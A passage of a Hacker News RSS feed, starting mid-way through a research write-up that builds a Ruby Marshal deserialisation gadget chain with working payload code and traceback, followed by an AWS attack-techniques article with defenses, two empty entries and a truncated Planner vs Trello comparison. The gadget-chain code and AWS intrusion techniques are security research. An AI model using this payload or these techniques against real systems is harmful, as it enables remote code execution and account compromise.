<p><a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/optparse.rb#L2085">OptionParser::ParseError</a> which allowed <code>join</code> to be called, as well as the <code>[]</code> method with a controlled argument:</p>

<div><div><pre><code><span>class</span> <span>ParseError</span> <span>&lt;</span> <span>RuntimeError</span>
  <span>def</span> <span>initialize</span><span>(</span><span>*</span><span>args</span><span>,</span> <span>additional: </span><span>nil</span><span>)</span>
    <span>@additional</span> <span>=</span> <span>additional</span>
    <span>@arg0</span><span>,</span> <span>=</span> <span>args</span>
    <span>@args</span> <span>=</span> <span>args</span>
    <span>@reason</span> <span>=</span> <span>nil</span>
  <span>end</span>

  <span>attr_reader</span> <span>:args</span>
  <span>attr_writer</span> <span>:reason</span>
  <span>attr_accessor</span> <span>:additional</span>

  <span>alias</span> <span>to_s</span> <span>message</span>

  <span>def</span> <span>message</span>
    <span>"</span><span>#{</span><span>reason</span><span>}</span><span>: </span><span>#{</span><span>args</span><span>.</span><span>join</span><span>(</span><span>' '</span><span>)</span><span>}#{</span><span>additional</span><span>[</span><span>@arg0</span><span>]</span> <span>if</span> <span>additional</span><span>}</span><span>"</span>
  <span>end</span>

  <span>def</span> <span>reason</span>
    <span>@reason</span> <span>||</span> <span>self</span><span>.</span><span>class</span><span>::</span><span>Reason</span>
  <span>end</span>
</code></pre></div></div>

<p>I went back to the other end of the gadget chain and started looking for places that called <code>read</code> on an object, and eventually discovered
<a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/package/tar_reader.rb#L61">Gem::Package::TarReader</a> and <a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/package/tar_header.rb#L103">Gem::Package::TarHeader</a>:</p>

<div><div><pre><code><span>class</span> <span>Gem::Package::TarReader</span>
  <span>def</span> <span>each</span>
    <span>return</span> <span>enum_for</span> <span>__method__</span> <span>unless</span> <span>block_given?</span>

    <span>use_seek</span> <span>=</span> <span>@io</span><span>.</span><span>respond_to?</span><span>(</span><span>:seek</span><span>)</span>

    <span>until</span> <span>@io</span><span>.</span><span>eof?</span> <span>do</span>
      <span>header</span> <span>=</span> <span>Gem</span><span>::</span><span>Package</span><span>::</span><span>TarHeader</span><span>.</span><span>from</span> <span>@io</span>
      <span>return</span> <span>if</span> <span>header</span><span>.</span><span>empty?</span>
  <span># snip</span>
  <span>end</span>
<span>end</span>

<span>class</span> <span>Gem::Package::TarHeader</span>
  <span>def</span> <span>self</span><span>.</span><span>from</span><span>(</span><span>stream</span><span>)</span>
      <span>header</span> <span>=</span> <span>stream</span><span>.</span><span>read</span> <span>512</span>
      <span>empty</span> <span>=</span> <span>(</span><span>EMPTY_HEADER</span> <span>==</span> <span>header</span><span>)</span>
  <span># snip</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Since there already was initial gadget to call <code>each</code> (thanks to elttam) it looked very promising, a chain such as <code>Gem::Requirement#marshal_load -&gt; Gem::Package::TarReader#each -&gt; Gem::Package::TarHeader#from -&gt; Net::BufferedIO#read -&gt; Net::BufferedIO#LOG -&gt; Net::WriteAdapter#&lt;&lt;</code> could be created. This would allow for any method to be called, so long as it accepted a single parameter. Unfortunately, the content of the parameter was not controllable, but it was still a very powerful gadget.</p>

<p>For <code>TarHeader.from</code> to be called, a class that had a falsey <code>eof?</code> method was needed to pass the conditional. A suitable choice was<a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/package/tar_reader/entry.rb#L60">Gem::Package::TarReader::Entry</a> as the result of the <code>eof?</code> call was easily controllable:</p>

<div><div><pre><code><span>class</span> <span>Gem::Package::TarReader::Entry</span>
  <span>##</span>
  <span># Is the tar entry closed?</span>

  <span>def</span> <span>closed?</span>
    <span>@closed</span>
  <span>end</span>

  <span>##</span>
  <span># Are we at the end of the tar entry?</span>

  <span>def</span> <span>eof?</span>
    <span>check_closed</span>

    <span>@read</span> <span>&gt;=</span> <span>@header</span><span>.</span><span>size</span>
  <span>end</span>

  <span>def</span> <span>check_closed</span> <span># :nodoc:</span>
    <span>raise</span> <span>IOError</span><span>,</span> <span>"closed </span><span>#{</span><span>self</span><span>.</span><span>class</span><span>}</span><span>"</span> <span>if</span> <span>closed?</span>
  <span>end</span>
</code></pre></div></div>

<p>All of this could now be put together, giving the ability to call arbitrary methods on an object:</p>

<div><div><pre><code><span># Autoload the required classes</span>
<span>Gem</span><span>::</span><span>SpecFetcher</span>
<span>Gem</span><span>::</span><span>Installer</span>

<span># prevent the payload from running when we Marshal.dump it</span>
<span>module</span> <span>Gem</span>
  <span>class</span> <span>Requirement</span>
    <span>def</span> <span>marshal_dump</span>
      <span>[</span><span>@requirements</span><span>]</span>
    <span>end</span>
  <span>end</span>
<span>end</span>

<span>wa</span> <span>=</span> <span>Net</span><span>::</span><span>WriteAdapter</span><span>.</span><span>new</span><span>(</span><span>Kernel</span><span>,</span> <span>:vakzz</span><span>)</span>

<span>io</span> <span>=</span> <span>Gem</span><span>::</span><span>Package</span><span>::</span><span>TarReader</span><span>::</span><span>Entry</span><span>.</span><span>allocate</span>
<span>io</span><span>.</span><span>instance_variable_set</span><span>(</span><span>'@read'</span><span>,</span> <span>0</span><span>)</span>
<span>io</span><span>.</span><span>instance_variable_set</span><span>(</span><span>'@header'</span><span>,</span> <span>"aaa"</span><span>)</span>

<span>n</span> <span>=</span> <span>Net</span><span>::</span><span>BufferedIO</span><span>.</span><span>allocate</span>
<span>n</span><span>.</span><span>instance_variable_set</span><span>(</span><span>'@io'</span><span>,</span> <span>io</span><span>)</span>
<span>n</span><span>.</span><span>instance_variable_set</span><span>(</span><span>'@debug_output'</span><span>,</span> <span>wa</span><span>)</span>

<span>t</span> <span>=</span> <span>Gem</span><span>::</span><span>Package</span><span>::</span><span>TarReader</span><span>.</span><span>allocate</span>
<span>t</span><span>.</span><span>instance_variable_set</span><span>(</span><span>'@io'</span><span>,</span> <span>n</span><span>)</span>

<span>r</span> <span>=</span> <span>Gem</span><span>::</span><span>Requirement</span><span>.</span><span>allocate</span>
<span>r</span><span>.</span><span>instance_variable_set</span><span>(</span><span>'@requirements'</span><span>,</span> <span>t</span><span>)</span>


<span>payload</span> <span>=</span> <span>Marshal</span><span>.</span><span>dump</span><span>([</span><span>Gem</span><span>::</span><span>SpecFetcher</span><span>,</span> <span>Gem</span><span>::</span><span>Installer</span><span>,</span> <span>r</span><span>])</span>
<span>puts</span> <span>payload</span><span>.</span><span>inspect</span>
<span>puts</span> <span>Marshal</span><span>.</span><span>load</span><span>(</span><span>payload</span><span>)</span>
</code></pre></div></div>

<div><div><pre><code>Traceback (most recent call last):
       13: from /Users/will/.rubies/ruby-2.7.2/bin/irb:23:in `&lt;main&gt;'
       12: from /Users/will/.rubies/ruby-2.7.2/bin/irb:23:in `load'
       11: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/gems/2.7.0/gems/irb-1.2.6/exe/irb:11:in `&lt;top (required)&gt;'
       10: from (irb):297
        9: from (irb):297:in `load'
        8: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/requirement.rb:207:in `marshal_load'
        7: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/requirement.rb:297:in `fix_syck_default_key_in_requirements'
        6: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/package/tar_reader.rb:61:in `each'
        5: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/package/tar_header.rb:103:in `from'
        4: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
        3: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
        2: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;'
        1: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
NoMethodError (undefined method `vakzz' for Kernel:Module)
</code></pre></div></div>

<p>The issue was that the argument to the call was not controllable, but now nearly any class and method could be used in the gadget chain. In the original search for ways to call the <code>Net::WriteAdapter</code> methods, I had found quite a few that were discarded (due to being unlikely to have ways to call them) which could now be used. One of them was <a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/request_set.rb#L399">Gem::RequestSet#resolve</a>:</p>

<div><div><pre><code><span>def</span> <span>resolve</span><span>(</span><span>set</span> <span>=</span> <span>Gem</span><span>::</span><span>Resolver</span><span>::</span><span>BestSet</span><span>.</span><span>new</span><span>)</span>
  <span>@sets</span> <span>&lt;&lt;</span> <span>set</span>
  <span>@sets</span> <span>&lt;&lt;</span> <span>@git_set</span>
  <span># snip</span>
<span>end</span>
</code></pre></div></div>

<p>This was perfect as <code>@sets</code> and <code>@git_set</code> were both fully controllable, and the argument <code>set</code> would be assigned the log message <code>reading 512 bytes...</code> from the gadget chain. Another <code>Net::WriteAdapter</code> gadget could be used for <code>@sets</code>, it would end up calling the method with the uncontrolled data first but then again with the controlled <code>@git_set</code>.</p>

<p>The final gadget could then be constructed to trigger a call to <code>Kernel.system("id")</code>:</p>

<div><div><pre><code><span># Autoload the required classes</span>
<span>Gem</span><span>::</span><span>SpecFetcher</span>
<span>Gem</span><span>::</span><span>Installer</span>

<span># prevent the payload from …</span></code></pre></div></div></div></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html">https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html</a></em></p>]]>
            </description>
            <link>https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684217</guid>
            <pubDate>Fri, 08 Jan 2021 13:01:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Principles of Programming Languages (POPL) 2021 Videos]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684197">thread link</a>) | @matt_d
<br/>
January 8, 2021 | https://app.clowdr.org/conference/popl2021 | <a href="https://web.archive.org/web/*/https://app.clowdr.org/conference/popl2021">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://app.clowdr.org/conference/popl2021</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684197</guid>
            <pubDate>Fri, 08 Jan 2021 12:59:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing Clean Code. A function main role is avoid duplicated code? No, it's more]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684158">thread link</a>) | @relu_mesaros
<br/>
January 8, 2021 | https://flawless-bits.com/blog/clean-code-functions-and-methods | <a href="https://web.archive.org/web/*/https://flawless-bits.com/blog/clean-code-functions-and-methods">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://flawless-bits.com/blog/clean-code-functions-and-methods</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684158</guid>
            <pubDate>Fri, 08 Jan 2021 12:54:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lesser Known AWS Attacks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684084">thread link</a>) | @jbkavungal
<br/>
January 8, 2021 | https://tldrsec.com/blog/lesser-known-aws-attacks/ | <a href="https://web.archive.org/web/*/https://tldrsec.com/blog/lesser-known-aws-attacks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
        
          
        
        <blockquote data-dnt="true"><p lang="en" dir="ltr">What’s the AWS hacking tactic or technique everyone should be aware of but no one knows?</p>— Daniel Grzelak (@dagrz) <a href="https://twitter.com/dagrz/status/1336960817669914624?ref_src=twsrc%5Etfw">December 10, 2020</a></blockquote>


<p>This post will discuss lesser known attack techniques that I would use in attacking AWS accounts and conclude with a discussion of defenses. A common theme among many of these concepts is <strong>abusing trust</strong>, whether that is incorrectly trusting attacker controlled resources hosted on AWS, or the trust relationships between accounts or within an account.</p>

<p>I’ll discuss a few techniques in gaining initial access, recon, lateral movement between accounts, and data exfiltration.</p>

<div>
<h2>tl;dr</h2>
<ul>
<li><strong>Initial access</strong>: Backdoor community resources (e.g. AMIs, CloudFormation templates, Lambda Layers, etc.) or phish with Stack Sets.</li>
  <ul>
  <li><strong>Defense</strong>: Consider using Infrastructure as Code scanning tools to enforce
    secure defaults and resources that are allowed to be used.</li>
  </ul>
<li><strong>Recon</strong> Abuse naming patterns to guess resource IDs (like S3 bucket names) or
  fingerprint existing roles or services or vendors in use.</li>
  <ul>
  <li><strong>Defense</strong>: Follow least privilege so that even resources with known names
    cannot be accessed unless needed, and consider randomizing resource names.</li>
  </ul>  

  <li><strong>Lateral movement</strong>: Abusing trust and privileges across accounts (IAM, network-level, etc.).</li>
  <ul>
  <li><strong>Defense</strong>: Follow least privilege for cross account trust, assess if your
    cloud security posture has a "soft center," that if an attacker gets inside
    it's game over.</li>
  </ul>  

  <li><strong>Exfiltration</strong>: Share compromised resources to an account you control to speed
  exfiltration, or use DNS for stealthy exfiltration.</li>
  <ul>
  <li><strong>Defense</strong>: Set up auto-remediation that will automatically unshare resources
    shared with unknown accounts, and turn on logging for any VPC DNS resolvers.
    If you want to have an isolated network, consider running your own DNS
    resolver and disabling the one run by AWS.</li>
  </ul>  
</ul>
</div>



<p>My name is Scott Piper and I do independent AWS security consulting through my company Summit Route, helping in a variety of ways to improve the security of AWS environments for companies, primarily by providing <a href="https://summitroute.com/aws_security_training/">training</a>.</p>

<p>I’m often asked by red teams and pentesting companies what types of AWS attack techniques I would use. There are concepts from actual breaches and public techniques that I might use, but in this post I’ll discuss some additional, possibly lesser known, concepts or slight adjustments to known techniques.</p>

<h2 id="initial-access">Initial access</h2>



<p>The idea of backdooring community AMIs was first mentioned at Black Hat 2009 by <a href="https://twitter.com/narvanitis">Nicholas Arvanitis</a>, <a href="https://twitter.com/marcoslaviero">Marco Slaviero</a>, and <a href="https://twitter.com/haroonmeer">Haroon Meer</a> in their talk “Clobbering the Cloud” (<a href="https://www.blackhat.com/presentations/bh-usa-09/MEER/BHUSA09-Meer-ClobberCloud-SLIDES.pdf#page=121">slides</a> and <a href="http://www.youtube.com/watch?v=t9oTRabTymc&amp;t=48m20s">video</a>).  I investigated a <a href="https://summitroute.com/blog/2018/09/24/investigating_malicious_amis/">malicious AMI</a> in 2018 that would do Monero mining, and there have been other reports of this issue.</p>

<p>This same concept though can be applied to other resources on AWS, such as CloudFormation templates, Terraform modules, CDK libraries, Lambda Layers, SSM documents, Serverless Application Repository applications, Marketplace resources, container base images, etc.</p>

<p>The concept here is to make one of these resources available for people to use that when used would provide you with access to their account.</p>

<p>As part of AWS’s “shared responsibility model” AWS doesn’t seem to do any auditing of the resources in any of their “marketplaces”, meaning ways in which they host community generated resources.</p>

<p>Getting people to run these might be a little difficult, but an attacker could attempt to target the supply chain by going after the owners of existing popular resources here.  We’ve seen that in the world of Chrome browser extensions where the owners of popular extensions have been <a href="https://arstechnica.com/information-technology/2017/08/after-phishing-attacks-chrome-extensions-push-adware-to-millions/">phished</a>, or had their extensions <a href="https://arstechnica.com/information-technology/2014/01/malware-vendors-buy-chrome-extensions-to-send-adware-filled-updates/">purchased</a> and then used to deploy adware.  Other marketplaces have encountered similar issues, such as <a href="https://withatwist.dev/strong-password-rubygem-hijacked.html">Ruby gems hijacked</a>.</p>

<p>They may also be able to abuse aspects of how search and access works in the marketplace. For example, the Monero backdoored AMI I had investigated was able to find its way into a number of AWS accounts because the AWS CLI and other tooling did not require an <code>owners</code> flag be passed, which resulted in AWS randomly picking AMIs that matched the other attributes people specified. This flaw was registered as <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15869">CVE-2018-15869</a>.</p>

<h3 id="phishing-with-stack-sets">Phishing with Stack Sets</h3>

<p>When I do <a href="https://summitroute.com/aws_security_assessments/">AWS security assessments</a> for clients, I send them a link to a CloudFormation Stack Set. When they click this link, they’ll be asked to log into their AWS account if they haven’t already. Then they’ll be prompted asking them if they want to create resources in their environment. This will create an IAM role that I can assume into that has privileges for me to investigate their account.  This makes it very easy for me to gain access to accounts to perform the work I need to do.</p>

<p>An attacker could use this same technique to trick someone into deploying a more privileged role, a backdoored EC2, or other badness.  The URL is on the the domain <code>us-east-1.console.aws.amazon.com</code> and the referenced Stack Set is hosted in an S3 bucket (<a href="https://s3.amazonaws.com/summitroute-assets/security_assessment_access.template">here</a>), so everything is on AWS domains and thus for an attacker’s goals, this appears trustworthy.</p>

<p>But again, due to the shared responsibility model, AWS doesn’t audit any of these.</p>

<figure>
  <img src="https://tldrsec.com/assets/images/posts/lesser_known_aws_attacks/stack_set_link.png" alt="Stack set creation"><figcaption>
      Stack set creation.

    </figcaption></figure>

<h2 id="recon">Recon</h2>

<h3 id="abusing-naming-patterns">Abusing naming patterns</h3>

<p><a href="https://twitter.com/iann0036">Ian Mckay</a> wrote a post titled <a href="https://onecloudplease.com/blog/s3-bucket-namesquatting">S3 Bucket Namesquatting - Abusing predictable S3 bucket names</a> where he talks about how AWS and vendors frequently use naming patterns for their S3 bucket and how an attacker could abuse this predictably by creating an S3 bucket that uses this naming pattern. This attack is also referred to as bucket sniping.</p>

<p>Ian avoided diving into the specifics of the attack, so to describe this issue further with an example, Athena by default uses the pattern <code>aws-athena-query-results-ACCOUNTID-REGION</code>.  If an attacker knew your account ID, and you hadn’t yet started using Athena, but planned on it, they could create an S3 bucket in their own account that matched that pattern before you did, and either block you from using Athena by denying read/write access to that bucket, or they could open up read/write access to you on that bucket so you’d unknowingly be writing your Athena query results into the attacker’s bucket.</p>

<p>Luckily Athena encrypted the results, and around November 2019 they required you to create the bucket as opposed to just attempting to use it.  It’s likely now with the new <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/new-iam-condition-keys-amazon-s3-limit-requests-buckets-owned-specific-aws-accounts-specific-tls-versions/">s3:ResourceAccount</a> policy condition and the <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/bucket-owner-condition.html">–expected-bucket-owner</a> API condition that opportunities to abuse this concept by creating a public bucket would be reduced further.</p>

<p>However, instead of abusing this concept by creating an S3 bucket, an attacker could abuse it for recon.</p>

<p>For example, let’s say the attacker compromises an EC2 that has an IAM role that allows <code>s3:ListBucket</code> and <code>s3:GetObject</code> on <code>*</code>.  This would allow them to read any S3 buckets, but they would have to guess the names of the buckets.  This is an excellent place for someone to abuse these naming patterns.</p>

<p>As an example, AWS Config by default uses the S3 bucket <code>config-bucket-ACCOUNTID</code>.  That data then records the names of all the S3 buckets in the account. Therefore by knowing that one S3 bucket name and reading the contents, the attacker could find out the names of all other S3 buckets in the account and read those, along with knowing all the other metadata in the account.</p>

<p>There are other S3 buckets with naming patterns that may be valuable, and there may also be other types of resources.</p>

<h3 id="service-usage-recon">Service usage recon</h3>

<p>In order to determine if AWS Config is being used, you can check for the role associated with it, <code>AWSServiceRoleForConfig</code>.  If this has been setup from the Organization level, that role will be <code>AWSServiceRoleForConfigMultiAccountSetup</code>.     If they run GuardDuty, there will be a role named <code>AWSServiceRoleForAmazonGuardDuty</code>.</p>

<p>It is possible to identify the existence of IAM roles in one account from another account by creating an IAM role trust policy and attempting to reference a role in another account and seeing if it errors.  This concept was first discovered by <a href="https://twitter.com/dagrz">Daniel Grzelak</a> and presented at Kiwicon in 2016 (<a href="https://www.youtube.com/watch?list=PLWC1moz0aOb-h-6zlwviD304yBXeUnfFa&amp;v=vxgkHJz8ByI&amp;app=desktop">video</a>, <a href="https://github.com/dagrz/aws_pwn/blob/master/miscellanea/Kiwicon%202016%20-%20Hacking%20AWS%20End%20to%20End.pdf">slides</a>, <a href="https://github.com/dagrz/aws_pwn/blob/master/reconnaissance/validate_iam_principals.py">code</a> and <a href="https://github.com/dagrz/aws_pwn/blob/master/miscellanea/principals.txt">wordlist</a>).  That video is hilariously bad filming as it was done via a cellphone from someone in the audience and broken up into 6-minute clips. This concept is more thoroughly explained in <a href="https://twitter.com/SpenGietz">Spencer Gietzen’s</a> post <a href="https://rhinosecuritylabs.com/aws/aws-role-enumeration-iam-p2/">Unauthenticated AWS Role Enumeration (IAM Revisited)</a> and is incorporated into <a href="https://github.com/RhinoSecurityLabs/pacu">pacu</a>.</p>

<p>Once you identify that certain AWS services, vendors, or maybe just popular CloudFormation templates have been deployed in an account, it may help you narrow in on resources associated with those that use default names or naming patterns. By knowing those services are used in advance, you could avoid having Access Denied errors recorded in CloudTrail, which are more likely to generate alarms.</p>

<h2 id="lateral-movement-between-accounts">Lateral movement between accounts</h2>

<p>Companies are creating more and more AWS accounts for themselves, in large part due to separate accounts being a strong security boundary. However, they then interconnect those accounts heavily, which can blur or erase those security boundaries.</p>

<p>If an attacker had admin access inside one account, they could look to see what accounts it knows about and if they can access them.  They could use CloudMapper’s <a href="https://summitroute.com/blog/2018/06/13/cloudmapper_wot/">weboftrust</a> command to try to figure some of this out.
That command is mostly for finding what accounts the account being assessed trusts to access it though, and not which external accounts trust it.</p>

<p>Knowing who trusts your account can be valuable though.  CloudMapper’s <code>weboftrust</code> and the AWS service <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html">Access Analyzer</a> can show which resources in my account are trusted by other accounts and I would like to extend this further, looking at things like shared AMIs etc.</p>

<p>For an attacker, this could enable RCE into the other accounts.  For example, I’ve seen one company where they had an S3 bucket that hosted a bash script that every EC2 at the company was supposed to run at boot.  So if you modified that bash script you’d get RCE on every EC2 across every account at …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tldrsec.com/blog/lesser-known-aws-attacks/">https://tldrsec.com/blog/lesser-known-aws-attacks/</a></em></p>]]>
            </description>
            <link>https://tldrsec.com/blog/lesser-known-aws-attacks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684084</guid>
            <pubDate>Fri, 08 Jan 2021 12:44:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Planner vs. Trello: Comparison with Pros and Cons]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25683990">thread link</a>) | @svikashk
<br/>
January 8, 2021 | https://zepel.io/blog/microsoft-planner-vs-trello/ | <a href="https://web.archive.org/web/*/https://zepel.io/blog/microsoft-planner-vs-trello/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

            

            <figure>
                <img srcset="https://zepel.io/blog/content/images/size/w300/2021/01/Microsoft-Planner-vs-Trello.png 300w,
                            https://zepel.io/blog/content/images/size/w600/2021/01/Microsoft-Planner-vs-Trello.png 600w,
                            https://zepel.io/blog/content/images/size/w1000/2021/01/Microsoft-Planner-vs-Trello.png 1000w,
                            https://zepel.io/blog/content/images/size/w2000/2021/01/Microsoft-Planner-vs-Trello.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://zepel.io/blog/content/images/size/w2000/2021/01/Microsoft-Planner-vs-Trello.png" alt="Microsoft Planner vs Trello: Which is the ideal project management tool for your team?">
            </figure>

            <section>
                <div>
                    <p>When <a href="https://www.microsoft.com/en-us/microsoft-365/blog/2015/09/22/introducing-office-365-planner/">Microsoft launched Planner in 2015</a>, it was an attractive option for many teams who were looking for a <a href="https://zepel.io/compare/trello-alternative/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">Trello alternative</a>, especially if they were already in the Microsoft ecosystem.</p><p>This led many people to compare Microsoft Planner vs Trello to see what might be ideal for them.</p><p>I’ve used Trello extensively over several years and Microsoft Planner for a few months. With this experience, I’m going to share with you the pros and cons of both the tools and share the difference between Trello and Planner.</p><p>Let’s jump in.</p><h2 id="trello-vs-microsoft-planner-a-complete-review">Trello vs Microsoft Planner: A complete review</h2><h3 id="microsoft-planner-an-overview">Microsoft Planner: An Overview</h3><p>Microsoft Planner is a part of Office 365 suite that lets you organize your team’s work with intuitive, collaborative, visual task management.</p><figure><img src="https://zepel.io/blog/content/images/2021/01/plannerboard.png" alt="Boards in Microsoft Planner" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/plannerboard.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/plannerboard.png 1000w, https://zepel.io/blog/content/images/2021/01/plannerboard.png 1152w" sizes="(min-width: 720px) 720px"><figcaption>Boards in Planner</figcaption></figure><p>It comes with a Board you can use to create cards that are content-rich with files, images, checklists, labels, assignees, and due dates to set a deadline for tasks. This enables the members of your company, no matter their expertise, to manage tasks effectively.</p><p>Unlike other software, the tool uses different terminologies. For example, you don’t create projects, you create a plan. Also, columns in the board are called buckets. Since it’s primarily a <a href="https://zepel.io/kanban-software/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">kanban software tool</a>, it doesn’t come with other views such as List view.</p><p>It provides colour-coded charts that help you visualize the progress of task status as pie or bar charts. It connects with all of your Office 365 apps and makes task management easier for your teams.</p><h3 id="key-features-in-microsoft-planner">Key Features in Microsoft Planner</h3><ul><li>Boards</li><li>Content-rich cards</li><li>Assignees, due dates, and comments</li><li>Event scheduling</li><li>Project planning</li><li>File management</li><li>Performance reports</li><li>Labels</li><li>Task tracking</li><li>Office 365 integration</li></ul><h3 id="microsoft-planner-pricing">Microsoft Planner Pricing</h3><figure><img src="https://zepel.io/blog/content/images/2021/01/microsoft-planner-pricing.png" alt="Pricing for MS Planner" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/microsoft-planner-pricing.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/microsoft-planner-pricing.png 1000w, https://zepel.io/blog/content/images/size/w1600/2021/01/microsoft-planner-pricing.png 1600w, https://zepel.io/blog/content/images/2021/01/microsoft-planner-pricing.png 1690w" sizes="(min-width: 720px) 720px"><figcaption>Microsoft Planner Pricing</figcaption></figure><p>The tool is a part of Office 365 suite. The pricing plan includes a free 1-month trial. After the trial, you can choose between three plans:<br></p><p><strong>1. Microsoft 365 Business Basic</strong> - $5/member/month on an annual contract.</p><p>It includes:</p><ul><li>An email with 50 GB mailbox</li><li>HD video conferencing</li><li>1TB of online storage</li><li>Office Online</li></ul><p><strong>2. Microsoft 365 Business Standard</strong> - $12.50/member/month on an annual contract.</p><p>It includes:</p><ul><li>1 TB of file storage and sharing</li><li>Installed Office on Mac/PC</li><li>Office Apps on tablets and mobile phones<br></li></ul><p><strong>3. Microsoft 365 Business Premium</strong> - $20/member/month on an annual contract.</p><p>It includes:</p><ul><li>1 TB of file storage and sharing</li><li>an email with 50 GB mailbox</li><li>HD video conferencing</li><li>Installed office on Mac/PC</li><li>Office Apps on tablets and mobile phones</li></ul><p>As you can see, since the tool is part of a larger suite, you get more capabilities out of it. However, there are some big disadvantages to this, which we’ll discuss below.</p><h3 id="pros-of-using-microsoft-planner">Pros of using Microsoft Planner</h3><ul><li>It’s easy to get started with the tool. The user interface is simple and the experience in using the product is intuitive. I didn’t even have to go through their docs to understand how their product works.</li><li>You can quickly view all the tasks everyone is working across Boards (or Plans, as Microsoft calls them). This is particularly helpful to see if your teammate is overloaded with work.</li><li>You can view tasks and set their due dates using the in-built calendar feature. It’s known as “Schedule” view.</li><li>All members of the Plan are automatically informed via email notification about any changes or updates you make. This helps everyone to stay in-sync.</li><li>Communicating with all members of the plan is easy since it’s part of the Office 365 suite. This allows you to easily communicate via Outlook.</li><li>Integrates deeply with Onenote, Teams, and several other tools.</li><li>A unique and useful feature of the tool is its Planner Hub view. From the Planner Hub, your tasks can be broken down to give you a detailed report on where your time was spent the most. You can think of it as a time tracker.</li><li>Each <a href="https://zepel.io/agile/kanban/kanban-cards/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">Kanban card</a> has enough space for description, checklists, labels, assignees, and comments.</li><li>Adding members to your tasks and boards is effortless, especially if they’re already part of the Microsoft ecosystem. All you need to do is type their name and the tool will immediately bring a drop down to help you select them.</li><li>Buckets in this software allow you to customize your <a href="https://zepel.io/features/kanban-board/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">Kanban Board</a> to meet your team’s needs. Buckets are your Trello’s Lists or Columns in your board.</li></ul><h3 id="cons-of-using-microsoft-planner">Cons of using Microsoft Planner</h3><ul><li>The tool lets you add a single checklist per task with a maximum of 20 checkboxes. Teams working collaboratively can find it hard to and are likely to need more than just 20 checkboxes in a card.</li><li>Unlike in <a href="https://zepel.io/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">Zepel</a>, MS Planner does not allow you to view all tasks and subtasks (checklist) in one, nested view.</li><li>As a project management and a collaboration tool, it’s surprising to see that there is no way to mention a teammate in a comment and share files and documents in the conversation.</li><li>You’ll receive too many emails if your team begins to actively use the software.</li><li>Lack of detailed reports such as <a href="https://zepel.io/agile/reports/burndown/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">burndown chart</a>, burn up, and <a href="https://zepel.io/agile/reports/cumulative-flow-diagram/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">cumulative flow diagrams</a>.</li><li>Comments have character limits that can make it harder for teams to communicate exactly what they want to share.</li><li>Does not have developer-friendly features such as markdown, integrations with &nbsp;<a href="https://zepel.io/integrations/github/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">GitHub</a>, <a 